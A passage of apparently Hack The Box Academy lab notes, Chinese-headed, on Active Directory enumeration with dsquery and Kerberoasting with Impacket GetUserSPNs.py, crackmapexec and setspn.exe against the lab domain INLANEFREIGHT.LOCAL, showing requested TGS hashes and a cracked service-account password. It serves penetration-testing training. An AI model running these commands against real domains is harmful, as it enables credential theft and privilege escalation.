class="hljs-string">&quot;CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="通配符搜索"><a href="#通配符搜索" class="headerlink" title="通配符搜索"></a>通配符搜索</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; dsquery * <span class="hljs-string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><br><span class="hljs-string">&quot;CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="具有特定属性设置的用户-PASSWD-NOTREQD"><a href="#具有特定属性设置的用户-PASSWD-NOTREQD" class="headerlink" title="具有特定属性设置的用户 (PASSWD_NOTREQD)"></a>具有特定属性设置的用户 (PASSWD_NOTREQD)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; dsquery * <span class="hljs-literal">-filter</span> <span class="hljs-string">&quot;(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))&quot;</span> <span class="hljs-literal">-attr</span> distinguishedName userAccountControl<br><br>  distinguishedName                                                                              userAccountControl<br>  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    <span class="hljs-number">66082</span><br>  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      <span class="hljs-number">66080</span><br>  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="hljs-number">66080</span><br>  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ<span class="hljs-literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    <span class="hljs-number">66080</span><br>  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           <span class="hljs-number">546</span><br>  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           <span class="hljs-number">544</span><br>  CN=LOGISTICS<span class="hljs-variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               <span class="hljs-number">2080</span><br>  CN=FREIGHTLOGISTIC<span class="hljs-variable">$</span>,CN=Users,DC=INLANEFREIGHT,DC=LOCAL      <br></code></pre></td></tr></table></figure>

<h3 id="搜索域控制器"><a href="#搜索域控制器" class="headerlink" title="搜索域控制器"></a>搜索域控制器</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\forend.INLANEFREIGHT&gt; dsquery * <span class="hljs-literal">-filter</span> <span class="hljs-string">&quot;(userAccountControl:1.2.840.113556.1.4.803:=8192)&quot;</span> <span class="hljs-literal">-limit</span> <span class="hljs-number">5</span> <span class="hljs-literal">-attr</span> sAMAccountName<br><br> sAMAccountName<br> ACADEMY<span class="hljs-literal">-EA-DC01</span><span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>

<h1 id="横向移动和权限提升"><a href="#横向移动和权限提升" class="headerlink" title="横向移动和权限提升"></a>横向移动和权限提升</h1><h2 id="Kerberoasting-with-GetUserSPNs-py"><a href="#Kerberoasting-with-GetUserSPNs-py" class="headerlink" title="Kerberoasting with GetUserSPNs.py"></a>Kerberoasting with GetUserSPNs.py</h2><h3 id="使用-GetUserSPNs-py-列出-SPN-账户"><a href="#使用-GetUserSPNs-py-列出-SPN-账户" class="headerlink" title="使用 GetUserSPNs.py 列出 SPN 账户"></a>使用 GetUserSPNs.py 列出 SPN 账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend<br><br>Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation <br>---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------<br>backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               <br>sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               <br>MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               <br>MSSQLSvc/SQL-CL01-01inlanefreight.<span class="hljs-built_in">local</span>:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               <br>MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               <br>adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt; <br></code></pre></td></tr></table></figure>

<h3 id="请求所有-TGS-票据"><a href="#请求所有-TGS-票据" class="headerlink" title="请求所有 TGS 票据"></a>请求所有 TGS 票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request <br><br>Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation <br>---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------<br>backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               <br>sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               <br>MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               <br>MSSQLSvc/SQL-CL01-01inlanefreight.<span class="hljs-built_in">local</span>:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               <br>MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               <br>adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt;               <br><br><br><br>$krb5tgs$23$*BACKUPAGENT<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$<br>$krb5tgs$23$*SOLARWINDSMONITOR<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="请求单个-TGS-票据"><a href="#请求单个-TGS-票据" class="headerlink" title="请求单个 TGS 票据"></a>请求单个 TGS 票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev<br><br>Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation <br>---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------<br>MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  &lt;never&gt;               <br><br><br><br>$krb5tgs$23$*sqldev<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL/sqldev*<br></code></pre></td></tr></table></figure>

<h3 id="将-TGS-票据保存到输出文件"><a href="#将-TGS-票据保存到输出文件" class="headerlink" title="将 TGS 票据保存到输出文件"></a>将 TGS 票据保存到输出文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs<br><br>Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation <br>---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------<br>MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  &lt;never&gt;  <br></code></pre></td></tr></table></figure>

<h3 id="针对域控制器测试身份验证"><a href="#针对域控制器测试身份验证" class="headerlink" title="针对域控制器测试身份验证"></a>针对域控制器测试身份验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!<br></code></pre></td></tr></table></figure>

<h2 id="Kerberoasting-半手动方法"><a href="#Kerberoasting-半手动方法" class="headerlink" title="Kerberoasting - 半手动方法"></a>Kerberoasting - 半手动方法</h2><h3 id="使用-setspn-exe-枚举-SPN"><a href="#使用-setspn-exe-枚举-SPN" class="headerlink" title="使用 setspn.exe 枚举 SPN"></a>使用 setspn.exe 枚举 SPN</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">setspn.exe</span> -<span class="hljs-title">Q</span> */*</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Checking</span> <span class="hljs-title">domain</span> <span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function"><span class="hljs-title">CN</span>=<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Domain</span> <span class="hljs-title">Controllers</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">exchangeAB</span>/<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01</span></span><br><span class="hljs-function">        <span class="hljs-title">exchangeAB</span>/<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">TERMSRV</span>/<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01</span></span><br><span class="hljs-function">        <span class="hljs-title">TERMSRV</span>/<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">Dfsr</span>-12<span class="hljs-title">F9A27C</span>-<span class="hljs-title">BF97</span>-4787-9364-<span class="hljs-title">D31B6C55EB04</span>/<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">ldap</span>/<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="hljs-title">ForestDnsZones.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">ldap</span>/<span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01.INLANEFREIGHT.LOCAL</span>/<span class="hljs-title">DomainDnsZones.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">&lt;<span class="hljs-title">SNIP</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">CN</span>=<span class="hljs-title">BACKUPAGENT</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Service</span> <span class="hljs-title">Accounts</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Corp</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">backupjob</span>/<span class="hljs-title">veam001.inlanefreight.local</span></span><br><span class="hljs-function"><span class="hljs-title">CN</span>=<span class="hljs-title">SOLARWINDSMONITOR</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Service</span> <span class="hljs-title">Accounts</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Corp</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">sts</span>/<span class="hljs-title">inlanefreight.local</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">&lt;<span class="hljs-title">SNIP</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">CN</span>=<span class="hljs-title">sqlprod</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Service</span> <span class="hljs-title">Accounts</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Corp</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">MSSQLSvc</span>/<span class="hljs-title">SPSJDB.inlanefreight.local</span>:1433</span><br><span class="hljs-function"><span class="hljs-title">CN</span>=<span class="hljs-title">sqlqa</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Service</span> <span class="hljs-title">Accounts</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Corp</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">MSSQLSvc</span>/<span class="hljs-title">SQL</span>-<span class="hljs-title">CL01</span>-01<span class="hljs-title">inlanefreight.local</span>:49351</span><br><span class="hljs-function"><span class="hljs-title">CN</span>=<span class="hljs-title">sqldev</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Service</span> <span class="hljs-title">Accounts</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Corp</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">MSSQLSvc</span>/<span class="hljs-title">DEV</span>-<span class="hljs-title">PRE</span>-<span class="hljs-title">SQL.inlanefreight.local</span>:1433</span><br><span class="hljs-function"><span class="hljs-title">CN</span>=<span class="hljs-title">adfs</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Service</span> <span class="hljs-title">Accounts</span>,<span class="hljs-title">OU</span>=<span class="hljs-title">Corp</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">INLANEFREIGHT</span>,<span class="hljs-title">DC</span>=<span class="hljs-title">LOCAL</span></span><br><span class="hljs-function">        <span class="hljs-title">adfsconnect</span>/<span class="hljs-title">azure01.inlanefreight.local</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Existing</span> <span class="hljs-title">SPN</span> <span class="hljs-title">found</span>!</span><br></code></pre></td></tr></table></figure>

<h3 id="Targeting-a-Single-User"><a href="#Targeting-a-Single-User" class="headerlink" title="Targeting a Single User"></a>Targeting a Single User</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.IdentityModel<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433&quot;</span><br><br>Id                   : uuid<span class="hljs-literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-2</span><br>SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;<br>ValidFrom            : <span class="hljs-number">2</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">36</span>:<span class="hljs-number">22</span> PM<br>ValidTo              : <span class="hljs-number">2</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> AM<br>ServicePrincipalName : MSSQLSvc/DEV<span class="hljs-literal">-PRE-SQL</span>.inlanefreight.local:<span class="hljs-number">1433</span><br>SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey<br></code></pre></td></tr></table></figure>

<h3 id="使用-setspn-exe-检索所有票据"><a href="#使用-setspn-exe-检索所有票据" class="headerlink" title="使用 setspn.exe 检索所有票据"></a>使用 setspn.exe 检索所有票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; setspn.exe <span class="hljs-literal">-T</span> INLANEFREIGHT.LOCAL <span class="hljs-literal">-Q</span> */* | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&#x27;^CN&#x27;</span> <span class="hljs-literal">-Context</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> | % &#123; <span class="hljs-built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$_</span>.Context.PostContext[<span class="hljs-number">0</span>].Trim() &#125;<br><br>Id                   : uuid<span class="hljs-literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-3</span><br>SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;<br>ValidFrom            : <span class="hljs-number">2</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">56</span>:<span class="hljs-number">18</span> PM<br>ValidTo              : <span class="hljs-number">2</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> AM<br>ServicePrincipalName : exchangeAB/ACADEMY<span class="hljs-literal">-EA-DC01</span><br>SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey<br><br>Id                   : uuid<span class="hljs-literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-4</span><br>SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;<br>ValidFrom            : <span class="hljs-number">2</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">56</span>:<span class="hljs-number">18</span> PM<br>ValidTo              : <span class="hljs-number">2</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">58</span>:<span class="hljs-number">18</span> PM<br>ServicePrincipalName : kadmin/changepw<br>SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey<br><br>Id                   : uuid<span class="hljs-literal">-67a2100c-150f-477c-a28a-19f6cfed4e90-5</span><br>SecurityKeys         : &#123;System.IdentityModel.Tokens.InMemorySymmetricSecurityKey&#125;<br>ValidFrom            : <span class="hljs-number">2</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">56</span>:<span class="hljs-number">18</span> PM<br>ValidTo              : <span class="hljs-number">2</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> AM<br>ServicePrincipalName : WSMAN/ACADEMY<span class="hljs-literal">-EA-MS01</span><br>SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

